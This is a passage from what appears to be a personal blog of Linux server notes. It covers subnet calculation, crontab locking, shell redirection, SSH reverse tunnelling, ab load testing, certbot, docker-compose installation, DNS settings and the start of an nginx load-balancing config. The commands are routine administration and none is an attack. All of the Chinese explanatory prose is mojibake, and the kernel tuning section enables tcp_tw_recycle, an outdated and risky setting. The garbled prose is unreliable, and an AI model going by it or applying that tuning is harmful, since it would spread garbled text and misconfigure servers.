ç±»çš„é»˜è®¤å­ç½‘æ©ç ã€€<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span>ã€€ã€€</span><br><span class="line">C ç±»çš„é»˜è®¤å­ç½‘æ©ç ã€€<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">å­ç½‘æ©ç ä¸ IP åœ°å€ä¸€æ ·æ˜¯ <span class="number">32</span> ä½åœ°å€ï¼Œç„¶åå°† IP åœ°å€ä¸å­ç½‘æ©ç è¿›è¡Œä¸è¿ç®—å³å¯å¾—åˆ°ç½‘ç»œåœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">ä¾‹ï¼š</span><br><span class="line"></span><br><span class="line">IPåœ°å€ä¸º<span class="number">192.168</span><span class="number">.10</span><span class="number">.2</span>ï¼Œå­ç½‘æ©ç ä¸º<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span>ã€‚</span><br><span class="line">å…ˆå°†åè¿›åˆ¶è½¬æ¢æˆäºŒè¿›åˆ¶ï¼š</span><br><span class="line">IPåœ°å€ï¼š  <span class="number">11000000</span> <span class="number">10101000</span> <span class="number">00001010</span> <span class="number">00000010</span></span><br><span class="line">å­ç½‘æ©ç ï¼š <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11110000</span></span><br><span class="line">è¿›è¡Œä¸è¿ç®—ï¼šï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span><br><span class="line">          <span class="number">11000000</span> <span class="number">10101000</span> <span class="number">00001010</span> <span class="number">00000000</span></span><br><span class="line">åˆ™å¯å¾—å…¶ç½‘ç»œæ ‡è¯†ä¸º<span class="number">192.168</span><span class="number">.10</span><span class="number">.0</span>ï¼Œä¸»æœºæ ‡è¯†ä¸º<span class="number">2</span>ã€‚</span><br><span class="line"><span class="number">3.</span> æ©ç çš„ä¸åŒè¡¨ç¤ºå½¢å¼</span><br><span class="line"></span><br><span class="line">å·²ç»è¯´è¿‡äº†å­ç½‘æ©ç ä¹Ÿæ˜¯ <span class="number">32</span> ä½çš„åœ°å€ï¼Œé‚£ä¹ˆå¼€å¤´çš„ <span class="number">25</span> æ€ä¹ˆè½¬åŒ–å‘¢ï¼Ÿ</span><br><span class="line"></span><br><span class="line"><span class="number">25</span> çš„æ„æ€æ˜¯ç½‘ç»œå·ä¸º <span class="number">25</span>ï¼Œå°±ä»£è¡¨è¿ç»­çš„ <span class="number">25</span> ä¸ª <span class="number">1</span>ï¼Œç„¶åå‰©ä¸‹çš„ç”¨ <span class="number">0</span> è¡¥é½</span><br><span class="line"></span><br><span class="line">å³ <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">10000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> åŒ…å«çš„å…¶ä»–ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">è¿˜æ˜¯ä»¥è¿™ä¸ªä¿¡æ¯ä¸ºä¾‹ï¼šXX.XX.XX<span class="number">.128</span>/<span class="number">25</span>ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ‹¿åˆ°ä»€ä¹ˆä¿¡æ¯å‘¢ï¼Ÿ</span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰ä¸»æœºå·ï¼šä¸»æœºå· + ç½‘ç»œå· = <span class="number">32</span>ï¼Œ<span class="number">32</span><span class="number">-25</span>=<span class="number">7</span></span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰ç½‘ç»œåœ°å€ï¼šå½“ <span class="number">7</span> ä½ä¸»æœºå·å…¨ä¸º <span class="number">0</span>ï¼Œä¹Ÿå°±æ˜¯ XX.XX.XX<span class="number">.128</span></span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰å¹¿æ’­åœ°å€ï¼šå½“ <span class="number">7</span> ä½ä¸»æœºå·å…¨ä¸º <span class="number">1</span>ï¼Œä¹Ÿå°±æ˜¯ XX.XX.XX<span class="number">.255</span></span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰å¯ç”¨åœ°å€æ•°é‡ï¼š<span class="number">7</span> ä½ä¸»æœºå·æœ‰ <span class="number">2</span>^<span class="number">7</span> ç§ç»“æœï¼Œä½†æ˜¯è¦å»æ‰ç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€ï¼Œå³ï¼š<span class="number">2</span>^<span class="number">7</span><span class="number">-2</span>=<span class="number">126</span> (è¿™ä¸ªä¹Ÿå°±æ˜¯è¿ç»´æ‰€è¯´çš„ä¸€ç™¾å¤šä¸ª ip)https:<span class="comment">//learnku.com/articles/35666</span></span><br></pre></td></tr></table></figure>
<h3 id="sshå…å¯†ç™»å½•æ¼æ´"><a href="#sshå…å¯†ç™»å½•æ¼æ´" class="headerlink" title="sshå…å¯†ç™»å½•æ¼æ´"></a>sshå…å¯†ç™»å½•æ¼æ´</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ll .ssh/</span><br><span class="line">total <span class="number">42944</span></span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">43918390</span> Nov  <span class="number">6</span>  <span class="number">2017</span> authorized_keys</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root     <span class="number">3415</span> Apr <span class="number">26</span>  <span class="number">2019</span> known_hosts</span><br><span class="line">[root@localhost ~]# cat .ssh/known_hosts</span><br><span class="line">git.coding.net,<span class="number">221.193</span><span class="number">.246</span><span class="number">.6</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHOWdwLpkos2CLli6DFvQ36yQE6Pe/PtFp3XwyirfZCIoGWnedaWI8zkJWVCs0wgOB9/urFepTDfV2wN49KGy1sl2/CCDEH2K/zeoEAZlTcBrhU17bwg1yMHCyJ7IM+zdLzItDEKYjgoWqVdUGK1dXQQlwt7GP4W7HqffelQQoVxOMoZ5N50MzD+nvV4y8iq0KwDQNy62iU4hui9ajCSVUDLu/<span class="number">06</span>ucd5IojSI9keRIYAXvQf52TJ5EbvoBggp9RhjuWNEG8IhnPP6rzPS11Ocmwg/Hs</span><br><span class="line">æ‰“å¼€ vi authorized_keys å¹¶æ²¡æœ‰ä»»ä½•ä¸œè¥¿ã€‚ç„¶åæˆ‘é¡ºå¸¦æŠŠå…¶å®ƒ /root/.ssh/ ä¸‹çš„å››ä¸ªæ–‡ä»¶éƒ½ç¿»äº†ä¸€éã€‚</span><br><span class="line">æ‰å‘ç° known_hosts æ–‡ä»¶ä¸­å¤šäº†ä¸¤ä¸ª IP åœ°å€ä¸ºæ–°åŠ å¡çš„ ssh key  https:<span class="comment">//learnku.com/articles/35888</span></span><br></pre></td></tr></table></figure>
<h3 id="crontab-æŒ‡å®šç”¨æˆ·"><a href="#crontab-æŒ‡å®šç”¨æˆ·" class="headerlink" title="crontab æŒ‡å®šç”¨æˆ·"></a>crontab æŒ‡å®šç”¨æˆ·</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥åœ¨ /etc/crontab ä¸­ç¼–è¾‘å®šæ—¶ä»»åŠ¡å³å¯ï¼ŒåŠ ä¸Šç”¨æˆ·å</span><br><span class="line">SHELL=<span class="regexp">/bin/</span>sh</span><br><span class="line">PATH=<span class="regexp">/usr/</span>local/sbin:<span class="regexp">/usr/</span>local/bin:<span class="regexp">/sbin:/</span>bin:<span class="regexp">/usr/</span>sbin:<span class="regexp">/usr/</span>bin</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line"><span class="number">17</span> *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># cron</span><br><span class="line">* * * * *  www-data flock /tmp/flock1.lock -c <span class="string">'timeout 200 /usr/local/bin/php /var/www/html/laravel/artisan command &gt;&gt; /home/log/laravel.log 2&gt;&amp;1'</span></span><br><span class="line">flock ç”¨æ¥é˜²æ­¢é‡å¤æ‰§è¡Œï¼Œèµ·åˆ°åŸå­é”ä½œç”¨</span><br><span class="line">                                                                                                                                                  timeout è¡¨ç¤ºè¿™ä¸ªè„šæœ¬æ‰§è¡Œè¿‡é•¿ï¼Œå’±å°±å¹²æ­»å®ƒï¼Œå¯ä»¥æœ‰æ•ˆé¿å…å„ç§å¾ªç¯æˆ–é•¿æ—¶é—´å ç”¨é—®é¢˜</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35948</span></span><br><span class="line"></span><br><span class="line">* * * * * flock -xn /tmp/test.lock -c <span class="string">"timeout 200 php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1"</span> </span><br><span class="line">æƒ³ <span class="number">10</span>s æ‰§è¡Œä¸€æ¬¡æ€ä¹ˆåŠï¼Ÿ</span><br><span class="line"></span><br><span class="line">* * * * * php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">* * * * * ( sleep <span class="number">10</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">20</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">30</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">40</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">50</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br></pre></td></tr></table></figure>
<h3 id="gt-gt-gt"><a href="#gt-gt-gt" class="headerlink" title="&gt;  &gt;&gt;"></a>&gt;  &gt;&gt;</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; è¡¨ç¤ºè¦†ç›–è¿½åŠ </span><br><span class="line">&gt;&gt; è¡¨ç¤ºå°¾éƒ¨è¿½åŠ </span><br><span class="line">è¿™ä¸¤ä¸ªç®¡é“æ“ä½œç¬¦ï¼Œåœ¨æ‰§è¡ŒæœŸé—´å‘ç”Ÿé”™è¯¯æ—¶ï¼Œæ˜¯ä¸ä¼šå°†é”™è¯¯è¾“å‡ºå†™å…¥åé¢çš„ã€Œæ–‡ä»¶ã€ä¸­çš„ã€‚</span><br><span class="line">åœ¨ Linux ç³»ç»Ÿä¸­ <span class="number">0</span>ã€<span class="number">1</span>ã€<span class="number">2</span> åˆ†åˆ«è¡¨ç¤ºä¸åŒçš„è®¾å¤‡ç±»å‹ï¼Œå…¶ä¸­</span><br><span class="line"></span><br><span class="line"><span class="number">0</span> æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼ŒæŒ‡é”®ç›˜</span><br><span class="line"><span class="number">1</span> æ ‡å‡†æ­£ç¡®è¾“å‡ºè®¾å¤‡</span><br><span class="line"><span class="number">2</span> æ ‡å‡†é”™è¯¯è¾“å‡ºè®¾å¤‡</span><br><span class="line">php artisan command &gt;&gt; <span class="regexp">/home/</span>log/laravel.log <span class="number">2</span>&gt;&amp;<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">ä¸Šé¢å‘½ä»¤çš„æ„æ€æ˜¯å°† php artisan command çš„ æ ‡å‡†æ­£ç¡®è¾“å‡º é‡å®šå‘åˆ° laravel.log æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="string">è€Œåé¢çš„ 2&gt;&amp;1 æ˜¯è¡¨ç¤ºå°†æ ‡æ³¨é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†æ­£ç¡®è¾“å‡ºã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä»è€Œè¾¾åˆ°é”™è¯¯è¾“å‡ºå’Œæ­£ç¡®è¾“å‡ºéƒ½è®°å½•åœ¨ laravel.log æ–‡ä»¶ä¸­ã€‚</span></span><br></pre></td></tr></table></figure>
<h3 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//serveo.net/</span></span><br><span class="line">Î» ssh -R <span class="number">80</span>:localhost:<span class="number">3000</span> serveo.net</span><br><span class="line">Forwarding HTTP traffic <span class="keyword">from</span> https:<span class="comment">//habeo.serveo.net</span></span><br><span class="line">Press g to start a GUI session and ctrl-c to quit.</span><br></pre></td></tr></table></figure>
<h3 id="ab-å‹åŠ›æµ‹è¯•"><a href="#ab-å‹åŠ›æµ‹è¯•" class="headerlink" title="ab å‹åŠ›æµ‹è¯•"></a>ab å‹åŠ›æµ‹è¯•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ab -n <span class="number">2000</span> -c <span class="number">1000</span> http:<span class="comment">//www.xxx.com/index.php</span></span><br><span class="line">éœ€è¦è°ƒæ•´å†…æ ¸å‚æ•°ä»¥æ”¯æŒç«¯å£é‡ç”¨</span><br><span class="line">å‡å¦‚æˆ‘ç°åœ¨ä½¿ç”¨çš„æ˜¯ Linux æœåŠ¡å™¨ï¼Œæ‰¾åˆ°å¦‚ä¸‹æ–‡ä»¶</span><br><span class="line">sudo vim /etc/sysctl.conf</span><br><span class="line">æ·»åŠ å¦‚ä¸‹å†…å®¹</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_syncookies = <span class="number">1</span></span><br><span class="line">net.ipv4.tcp_tw_reuse = <span class="number">1</span></span><br><span class="line">net.ipv4.tcp_tw_recycle = <span class="number">1</span></span><br><span class="line">net.ipv4.tcp_fin_timeout = <span class="number">30</span></span><br><span class="line">kernel.printk = <span class="number">7</span> <span class="number">4</span> <span class="number">1</span> <span class="number">7</span></span><br><span class="line">è¿è¡Œ sudo sysctl â€“p ç”Ÿæ•ˆ</span><br><span class="line">https:<span class="comment">//learnku.com/articles/4765/simple-primary-stress-test</span></span><br></pre></td></tr></table></figure>
<h3 id="https-è¯ä¹¦æ³¨å†Œå·¥å…·"><a href="#https-è¯ä¹¦æ³¨å†Œå·¥å…·" class="headerlink" title="https è¯ä¹¦æ³¨å†Œå·¥å…·"></a>https è¯ä¹¦æ³¨å†Œå·¥å…·</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install certbot python-certbot-nginx</span><br><span class="line">certbot --nginx</span><br><span class="line">certbot renew --dry-run</span><br><span class="line"></span><br><span class="line">https://certbot.eff.org/</span><br></pre></td></tr></table></figure>
<h3 id="linuxå¡é¡¿æ€ä¹ˆæ’æŸ¥"><a href="#linuxå¡é¡¿æ€ä¹ˆæ’æŸ¥" class="headerlink" title="linuxå¡é¡¿æ€ä¹ˆæ’æŸ¥"></a>linuxå¡é¡¿æ€ä¹ˆæ’æŸ¥</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep php | awk <span class="string">'&#123;print $2&#125;'</span> | xargs kill <span class="number">-9</span></span><br><span class="line">æŸ¥çœ‹å†…å­˜ä½¿ç”¨çŠ¶å†µï¼šfree -g</span><br><span class="line">æŸ¥çœ‹ç£ç›˜ä½¿ç”¨çŠ¶å†µï¼šdf -h</span><br><span class="line">æŸ¥çœ‹ç£ç›˜I/Oä½¿ç”¨ï¼šiostat -dx</span><br><span class="line">æŸ¥çœ‹CPUä½¿ç”¨ï¼štop</span><br><span class="line"></span><br><span class="line">awk <span class="string">'æ¡ä»¶ç±»å‹ 1&#123;åŠ¨ä½œ1&#125; æ¡ä»¶ç±»å‹2&#123;åŠ¨ä½œ2&#125; ...'</span> filename</span><br><span class="line">awkåé¢æ¥ä¸¤ä¸ªå¼•å·å¹¶åŠ ä¸Šå¤§æ‹¬å·æ¥è®¾ç½®æƒ³è¦å¯¹æ•°æ®è¿›è¡Œçš„å¤„ç†åŠ¨ä½œã€‚https:<span class="comment">//tsmliyun.github.io/linux/%E4%B8%80%E6%AC%A1%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</span></span><br></pre></td></tr></table></figure>
<h3 id="docker-1"><a href="#docker-1" class="headerlink" title="docker"></a>docker</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -L <span class="string">"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)"</span> -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">[root@VM_0_11_centos html]# docker-compose version</span><br><span class="line">docker-compose version <span class="number">1.24</span><span class="number">.1</span>, build <span class="number">4667896</span>b</span><br><span class="line">docker-py version: <span class="number">3.7</span><span class="number">.3</span></span><br><span class="line">CPython version: <span class="number">3.6</span><span class="number">.8</span></span><br><span class="line">OpenSSL version: OpenSSL <span class="number">1.1</span><span class="number">.0</span>j  <span class="number">20</span> Nov <span class="number">2018</span></span><br><span class="line"> docker pull gogs/gogs</span><br><span class="line"> [root@VM_0_11_centos html]# docker start gogs</span><br><span class="line"> gogs</span><br><span class="line"> [root@VM_0_11_centos html]# docker ps</span><br><span class="line"> CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS</span><br><span class="line">   PORTS                                            NAMES</span><br><span class="line"> <span class="number">1</span>bd82406bba2        gogs/gogs           <span class="string">"/app/gogs/docker/stâ€¦"</span>   <span class="number">7</span> hours ago         Up <span class="number">7</span> hours</span><br><span class="line">   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">10022</span>-&gt;<span class="number">22</span>/tcp, <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">10080</span>-&gt;<span class="number">3000</span>/tcp   gogs</span><br><span class="line">   </span><br><span class="line">   https:<span class="comment">//learnku.com/articles/34941</span></span><br></pre></td></tr></table></figure>
<h3 id="cURL-error-28-Resolving-timed-out-after-5515-milliseconds"><a href="#cURL-error-28-Resolving-timed-out-after-5515-milliseconds" class="headerlink" title="cURL error 28: Resolving timed out after 5515 milliseconds"></a>cURL error 28: Resolving timed out after 5515 milliseconds</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/resolv.conf</span><br><span class="line">ä¸è¦æ‰‹åŠ¨ä¿®æ”¹ /etc/resolv.confï¼Œå› ä¸ºæ­¤æ–‡ä»¶åŠ¨æ€ç”Ÿæˆçš„ï¼Œå…ˆçœ‹ä¸‹æ–‡ä»¶ï¼š</span><br><span class="line"></span><br><span class="line">$ cat /etc/network/interfaces</span><br><span class="line">æœ€åä¸€è¡Œçš„ dns-nameservers æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼Œå¼€å§‹ä¿®æ”¹ï¼š</span><br><span class="line"></span><br><span class="line">$ vi /etc/network/interfaces</span><br><span class="line">æ¯”è¾ƒçŸ¥åçš„å…¬å…± DNS å¯ä»¥è¯·é—®è¿™é‡ŒæŸ¥çœ‹ https:<span class="comment">//www.ip.cn/dns.html ï¼Œè¿™é‡Œé€‰æ‹© 114 å’Œ é˜¿é‡Œçš„ DNS:</span></span><br><span class="line"></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet <span class="keyword">static</span></span><br><span class="line">address <span class="number">10.</span>x<span class="number">.23</span>.xxx</span><br><span class="line">netmask <span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">gateway <span class="number">10.</span>x<span class="number">.0</span>.x</span><br><span class="line">mtu <span class="number">1454</span></span><br><span class="line">dns-nameservers <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span> <span class="number">114.114</span><span class="number">.115</span><span class="number">.115</span> <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">æœ€åé¢ dns-nameservers æ˜¯ DNS ï¼Œä¿®æ”¹æœ€åä¸€è¡Œå³å¯ï¼Œä¿®æ”¹å®Œæˆåï¼š</span><br><span class="line"></span><br><span class="line">$ ifdown eth0 &amp;&amp; sudo ifup eth0</span><br><span class="line">é‡å¯æˆåŠŸåï¼Œç¡®è®¤æ˜¯å¦åº”ç”¨ä¸Šï¼š</span><br><span class="line"></span><br><span class="line">$ cat /etc/resolv.conf</span><br><span class="line">å¯ä»¥çœ‹åˆ°è¾“å‡ºï¼š</span><br><span class="line"></span><br><span class="line"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class="line">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class="line">nameserver <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line">nameserver <span class="number">114.114</span><span class="number">.115</span><span class="number">.115</span></span><br><span class="line">nameserver <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">https:<span class="comment">//learnku.com/ubuntu/t/32705</span></span><br></pre></td></tr></table></figure>
<h3 id="å†…å­˜æ¶ˆè€—æœ€å¤§çš„è¿›ç¨‹"><a href="#å†…å­˜æ¶ˆè€—æœ€å¤§çš„è¿›ç¨‹" class="headerlink" title="å†…å­˜æ¶ˆè€—æœ€å¤§çš„è¿›ç¨‹"></a>å†…å­˜æ¶ˆè€—æœ€å¤§çš„è¿›ç¨‹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_11_centos html]# ps aux --sort -rss | head</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root      <span class="number">3367</span>  <span class="number">0.0</span>  <span class="number">3.9</span> <span class="number">523176</span> <span class="number">74068</span> ?        Ssl  Nov14   <span class="number">0</span>:<span class="number">53</span> /usr/bin/dockerd -H fd:<span class="comment">// --containerd</span></span><br><span class="line">=<span class="regexp">/run/</span>containerd/containerd.sock</span><br><span class="line">ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head</span><br><span class="line">å¦‚æœä½ åªæƒ³æŸ¥çœ‹å‘½ä»¤åç§°è€Œä¸æ˜¯å‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼Œè¯·ä½¿ç”¨ä¸‹é¢çš„ ps å‘½ä»¤æ ¼å¼ã€‚</span><br><span class="line"></span><br><span class="line"># ps -eo pid,ppid,%mem,%cpu,comm --sort=-%mem | head</span><br><span class="line"># top -c -b -o +%MEM | head -n 20 | tail -15</span><br><span class="line">å¦‚æœä½ åªæƒ³æŸ¥çœ‹å‘½ä»¤åç§°è€Œä¸æ˜¯å‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼Œè¯·ä½¿ç”¨ä¸‹é¢çš„ top å‘½ä»¤æ ¼å¼ã€‚</span><br><span class="line"></span><br><span class="line"># top -b -o +%MEM | head -n 20 | tail -15</span><br><span class="line">https:<span class="comment">//cn.v2ex.com/t/619291#</span></span><br></pre></td></tr></table></figure>
<h3 id="Nginx-è´Ÿè½½å‡è¡¡"><a href="#Nginx-è´Ÿè½½å‡è¡¡" class="headerlink" title="Nginx è´Ÿè½½å‡è¡¡"></a>Nginx è´Ÿè½½å‡è¡¡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">è¯­æ³•: upstream name &#123; ... &#125; </span><br><span class="line">é»˜è®¤å€¼: â€”</span><br><span class="line">ä¸Šä¸‹æ–‡: http</span><br><span class="line"></span><br><span class="line">upstream æŒ‡ä»¤å½“ä¸­åŒ…å«serveræŒ‡ä»¤</span><br><span class="line">è¯­æ³•: server address [parameters]; </span><br><span class="line">ä¸Šä¸‹æ–‡: upstream</span><br><span class="line"></span><br><span class="line">ä¾‹å­:</span><br><span class="line">upstream backend &#123;</span><br><span class="line">    server backend1.example.com:<span class="number">8081</span> weight=<span class="number">4</span> max_fails=<span class="number">2</span> fail_timeout=<span class="number">30</span>s; 